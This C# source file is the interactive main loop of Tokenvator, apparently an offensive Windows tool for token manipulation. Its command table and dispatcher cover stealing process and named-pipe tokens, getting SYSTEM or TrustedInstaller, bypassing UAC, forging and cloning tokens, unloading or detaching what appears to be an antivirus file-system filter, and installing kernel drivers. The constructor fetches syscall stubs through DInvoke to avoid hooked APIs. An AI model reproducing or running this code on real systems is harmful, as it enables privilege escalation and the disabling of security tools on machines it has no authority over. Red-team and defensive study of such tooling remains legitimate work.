using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

using DInvoke.DynamicInvoke;

using Tokenvator.Plugins.Enumeration;
using Tokenvator.Resources;

using MonkeyWorks.Unmanaged.Headers;

namespace Tokenvator
{
    using MonkeyWorks = MonkeyWorks.Unmanaged.Libraries.DInvoke;

    partial class MainLoop
    {
        private const string context = "(Tokens) > ";
        public static string[,] options = new string[,] {
            {"Info", "all", "-", "Info /All"},
            {"Help", "Command", "-", "Help List_Filter_Instances"},
            {"History", "-", "-", "History"},
            {"", "", "", ""},

            {"Add_Privilege", "Process", "Privilege", "Add_Privileges /Privilege:SeCreateTokenPrivilege"},
            {"List_Privileges", "Process", "-", "List_Privileges /Process:powershell.exe \nList_Privileges /Process:27015"},
            {"Enable_Privilege", "Process", "Privilege", "Enable_Privilege /Process:2180 /Privilege:SeShutdownPrivilege \nEnable_Privilege /Process:powershell.exe /Privilege:SeShutdownPrivilege"},
            {"Disable_Privilege", "Process", "Privilege", "Disable_Privilege /Process:2180 /Privilege:SeShutdownPrivilege \nDisable_Privilege /Process:powershell.exe /Privilege:SeShutdownPrivilege"},
            {"Remove_Privilege", "Process", "Privilege", "Remove_Privilege /Process:2180 /Privilege:SeShutdownPrivilege \nRemove_Privilege /Process:powershell.exe /Privilege:SeShutdownPrivilege"},
            {"Nuke_Privileges", "Process", "-", "Nuke_Privileges /Process:2180 \nNuke_Privileges /Process:powershell.exe"},
            {"", "", "", ""},
            
            {"GetSystem", "Command", "-", "GetSystem \nGet_System \nGetSystem /command:cmd.exe /c start powershell.exe"},
            {"GetTrustedInstaller", "Command", "-", "GetTrustedInstaller \nGet_TrustedInstaller \nGetTrustedInstaller /command:\"cmd.exe /c powershell.exe\""},
            {"Steal_Token", "Command", "Process", "Steal_Token /Process:2180 | Steal_Token /Process:2180 /Command:cmd.exe"},
            {"Steal_Pipe_Token", "Command", "PipeName", @"Steal_Pipe_Token /PipeName:\\.\pipe\tokenvator \nSteal_Pipe_Token /PipeName:tokenvator /command:cmd.exe"},
            {"BypassUAC", "ProcessID", "Command", "BypassUAC /Command:cmd.exe \nBypassUAC /Process:892 /Command:cmd.exe"},
            {"", "", "", ""},

            {"Tasklist", "-", "-", "Tasklist"},
            {"Sample_Processes", "-", "-", "Sample_Processes"},
            {"Sample_Processes_WMI", "-", "-", "Sample_Processes_WMI"},
            {"Find_User_Processes", "-", "User", "Find_User_Processes /User:Administrator"},
            {"Find_User_Processes_WMI", "-", "User", "Find_User_Processes_WMI /User:Administrator"},
            {"List_All_Tokens", "-", "-", "List_All_Tokens"},
            {"", "", "", ""},

            {"List_Filters", "-", "-", "List_Filters"},
            {"List_Filter_Instances", "-", "Filter", "List_Filter_Instances /Filter:vsepflt"},
            {"Detach_Filter", "Instance", "Filter, Volume", "Detach_Filter /Filter:vsepflt /Volume:\\Device\\Mup /Instance:\"vsepflt Instance\""},
            {"Unload_Filter", "-", "Filter", "Unload_Filter /Filter:vsepflt"},
            {"", "", "", ""},

            {"Clear_Desktop_Acl", "-", "-", "Clear_Desktop_Acl"},
            {"", "", "", ""},

            {"Install_Driver", "-", "ServiceName, DriverFilePath", "Install_Driver /ServiceName:TokenDriver /Path:C:\\Share\\KernelTokens.sys"},
            {"Start_Driver", "-", "ServiceName", "Start_Driver /ServiceName:TokenDriver"},
            {"UnInstall_Driver", "-", "ServiceName", "UnInstall_Driver /ServiceNameTokenDriver"},
            {"", "", "", ""},

            {"RunAs", "Command", "UserName, Password", "RunAs /Username:Administrator /Password:Password1 /Command:cmd.exe"},
            {"Logon_User", "Command, Password, Groups", "UserName", "logon_user /Username:networkservice /Command:cmd.exe"},
            {"Create_Token", "UserName, Groups", "Command", "Create_Token /User:Administrator /Groups:tvator_group,sql_admins_group /Command:cmd.exe"},
            {"Clone_Token", "Process", "Command", "Clone_Token /Process:sqlservr /Command:cmd.exe"},
            {"", "", "", ""},

            {"Terminate", "Process", "-", "Terminate /Process:2180"},
            {"Is_Critical_Process", "Process", "-", "Is_Critical_Process /Process:word.exe"},
            {"Set_Critical_Process", "Process", "-", "Set_Critical_Process /Process:excel.exe /true \nSet_Critical_Process /Process:excel.exe"},
            {"", "", "", ""},

            {"Sessions", "-", "-", "Sessions"},
            {"PID", "-", "-", "PID"},
            {"WhoAmI", "-", "-", "WhoAmI"},
            {"RevertToSelf", "-", "-", "RevertToSelf"},
            {"Run", "-", "Command", "run cmd.exe \nrun /command:\"cmd.exe /c start cmd.exe\""},
            {"RunPowerShell", "-", "Command", "RunPowerShell \nRunPowerShell /Command:Get-ChildItem"},
            {"", "", "", ""}
        };

        private CommandLineParsing cLP;
        private readonly TabComplete console;
        private readonly bool activateTabs;

        private Process process;

        private IntPtr currentProcessToken;
        private readonly IntPtr currentProcessTokenBackup;

        public MainLoop(bool activateTabs)
        {
            this.activateTabs = activateTabs;
            if (activateTabs)
            {
                console = new TabComplete(context, options);
            }

            currentProcessToken = new IntPtr();
            currentProcessTokenBackup = new IntPtr();

            ////////////////////////////////////////////////////////////////////////////////
            // Open a limited handle to the process via a syscall stub
            // IntPtr hProcess = kernel32.OpenProcess(ProcessThreadsApi.ProcessSecurityRights.PROCESS_QUERY_INFORMATION, false, (uint)processId);
            //////////////////////////////////////////////////////////////////////////////// 
            IntPtr hNtOpenProcessToken;
            try
            {
                hNtOpenProcessToken = Generic.GetSyscallStub("NtOpenProcessToken");
            }
            catch (Exception ex)
            {
                Misc.GetExceptionMessage(ex, "GetSyscallStub - NtOpenProcessToken");
                return;
            }

            var fSyscallNtOpenProcessToken = (MonkeyWorks.ntdll.NtOpenProcessToken)Marshal.GetDelegateForFunctionPointer(hNtOpenProcessToken, typeof(MonkeyWorks.ntdll.NtOpenProcessToken));

            uint ntRetVal = 0;
            try
            {
                IntPtr hProcess = new IntPtr(-1);
                ntRetVal = fSyscallNtOpenProcessToken(hProcess, Winnt.TOKEN_ALL_ACCESS, ref currentProcessTokenBackup);
            }
            catch (Exception ex)
            {
                Misc.GetExceptionMessage(ex, "NtOpenProcessToken");
            }

            if (0 != ntRetVal)
            {
                Misc.GetNtError("NtOpenProcessToken", ntRetVal);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Mainloop
        /// </summary>
        ////////////////////////////////////////////////////////////////////////////////
        internal void Run()
        {
            currentProcessToken = currentProcessTokenBackup;

            Console.Write(context);
            string input;
            if (activateTabs)
            {
                try
                {
                    input = console.ReadLine();
                }
                catch (InvalidOperationException)
                {
                    input = Console.ReadLine();
                }
            }
            else
            {
                input = Console.ReadLine();
            }               

            string action = Misc.NextItem(ref input);

            cLP = new CommandLineParsing();
            if (!cLP.Parse(input))
            {
                return;
            }    

            try
            {
                switch (action)
                {
                    case "add_privilege":
                        _AddPrivilege();
                        break;
                        /*
                    case "bypassuac":
                        _BypassUAC(cLP, hToken);
                        break;
                        */
                    case "clear_desktop_acl":
                        _ClearDesktopACL();
                        break;
                    case "clone_token":
                        _CloneToken();
                        break;
                    case "create_token":
                        _CreateToken();
                        break;
                    case "delete_driver":
                        _UnInstallDriver();
                        break;
                    case "detach_filter":
                        _FilterDetach();
                        break;
                    case "disable_group":
                        _DisableGroup();
                        break;
                    case "disable_privilege":
                        _AlterPrivilege(Winnt.TokenPrivileges.SE_PRIVILEGE_NONE);
                        break;
                    case "enable_privilege":
                        _AlterPrivilege(Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED);
                        break;
                    case "exit":
                        Environment.Exit(0);
                        break;
                    case "find_user_processes":
                        _FindUserProcesses();
                        break;
                    case "find_user_processes_wmi":
                        _FindUserProcessesWMI();
                        break;
                    case "getinfo":
                        _Info();
                        break;
                    case "getsystem":
                        _GetSystem();
                        break;
                    case "get_system":
                        _GetSystem();
                        break;
                    case "gettrustedinstaller":
                        _GetTrustedInstaller();
                        break;
                    case "get_trustedinstaller":
                        _GetTrustedInstaller();
                        break;
                    case "help":
                        _Help(input);
                        break;
                    case "history":
                        console.GetHistory();
                        break;
                    case "info":
                        _Info();
                        break;
                    case "install_driver":
                        _InstallDriver();
                        break;
                    case "list_filters":
                        _ListFilters();
                        break;
                    case "list_filter_instances":
                        _ListFiltersInstances();
                        break;
                    case "list_privileges":
                        _ListPrivileges();
                        break;
                    case "list_all_tokens":
                        _ListAllTokens();
                        break;
                    case "logon_user":
                        _LogonUser();
                        break;
                    case "nuke_privileges":
                        _NukePrivileges();
                        break;
                    case "pid":
                        Console.WriteLine("[+] Process ID: {0}", Process.GetCurrentProcess().Id);
                        Console.WriteLine("[+] Parent ID:  {0}", Process.GetCurrentProcess().Parent().Id);
                        break;
                    case "remove_privilege":
                        _AlterPrivilege(Winnt.TokenPrivileges.SE_PRIVILEGE_REMOVED);
                        break;
                    case "is_critical_process":
                        _IsCriticalProcess();
                        break;
                    case "set_critical_process":
                        _SetCriticalProcess();
                        break;
                    case "reverttoself":
                        _RevertToSelf();
                        break;
                    case "run":
                        _Run();
                        break;
                    case "runas":
                        _RunAsNetOnly();
                        break;
                    case "runpowershell":
                        _RunPowerShell();
                        break;
                    case "sample_processes":
                        _SampleProcess();
                        break;
                    case "sample_processes_wmi":
                        _SampleProcessWMI();
                        break;
                    case "sessions":
                        UserSessions.EnumerateInteractiveUserSessions();
                        break;
                    case "start_driver":
                        _StartDriver();
                        break;
                    case "steal_pipe_token":
                        _StealPipeToken();
                        break;
                    case "steal_token":
                        _StealToken();
                        break;
                    case "tasklist":
                        UserSessions.Tasklist();
                        break;
                    case "terminate":
                        _Terminate();
                        break;
                    case "unfreeze_token":
                        _UnfreezeToken();
                        break;
                    case "uninstall_driver":
                        _UnInstallDriver();
                        break;
                    case "unload_filter":
                        _FilterUnload();
                        break;
                    case "whoami":
                        Console.WriteLine("[*] Operating as {0}", WindowsIdentity.GetCurrent().Name);
                        break;
                    default:
                        _Help(input);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                Misc.GetWin32Error("MainLoop");
            }
            Console.WriteLine();
        }
    }
}
